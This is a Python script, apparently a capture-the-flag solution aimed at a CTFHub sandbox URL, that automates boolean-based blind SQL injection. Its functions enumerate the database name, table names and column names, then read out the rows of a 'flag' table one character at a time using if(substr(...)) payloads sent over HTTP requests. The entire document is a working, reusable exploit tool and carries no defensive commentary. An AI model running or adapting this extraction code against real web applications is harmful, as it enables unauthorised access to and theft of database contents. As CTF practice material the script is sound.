#! /usr/bin/env python
# -*- coding: utf-8 -*-
import requests

# 爆库
def dataBaseName(url, mark):
    name = ''
    for i in range(1, 9):
        for j in "sqcwertyuioplkjhgfdazxvbnm":
            payload = url + "if(substr(database(),%d,1)='%s',1,0)" % (i, j)
            r = requests.get(payload)
            if mark in r.text:
                name = name + j
                print(name)
                break   
    print('数据库名:', name)

# 爆表
def table_name(url,mark):
    tableList = []
    for i in range(0,4):
        name = ''
        for j in range(1,9):
            for k in 'sqcwertyuioplkjhgfdazxvbnm':
                payload = url + "if(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)='%s',1,0)" %(i,j,k)
                r = requests.get(payload)
                if mark in r.text:
                    name = name + k
                    print(name)
                    break
        tableList.append(name)
    print('table_name:',tableList)

# 爆字段
def column_name(url,mark):
    columnList = []
    for i in range(0,3):
        columnName = ''
        for j in range(1,9):
            for k in 'sqcwertyuioplkjhgfdazxvbnm':
                payload = url + "if(substr((select column_name from information_schema.columns where table_name='flag' and table_schema = database() limit %d,1),%d,1)='%s',1,0)" %(i,j,k)
                r = requests.get(payload)
                if mark in r.text:
                    columnName += k
                    print(columnName)
                    break
        columnList.append(columnName)
    print("字段名：",columnList)

# 爆字段第一个行内容
def get_data(url,mark):
    data = ''
    for i in range(1,50):
        for j in range(48,126):
            payload = url + 'if(ascii(substr((select flag from flag),%d,1))=%d,1,0)' %(i,j)
            r = requests.get(payload)
            if mark in r.text:
                data += chr(j)
                print(data)
                break
    print("字段第一个值",data)

# 爆字段前10行内容
def get_datas(url,mark):
    dataList = []
    for i in range(1,10):
        data = ''
        for j in range(1,50):
            for k in range(48,126):
                payload = url + 'if(ASCII(SUBSTR((SELECT flag FROM `flag` limit %d,1),%d,1))=%d,1,0)' %(i,j,k)
                r = requests.get(payload)
                if mark in r.text:
                    data += chr(k)
                    print(data)
                    break
        dataList.append(data)
    print("字段前10行内容",dataList)
        


if __name__ == "__main__":
    url = "http://challenge-f6a8eccab67290e1.sandbox.ctfhub.com:10800/?id="
    mark = "query_success"
    #dataBaseName(url, mark)
    #table_name(url, mark)
    #column_name(url, mark)
    #get_data(url,mark)
    #get_datas(url, mark)
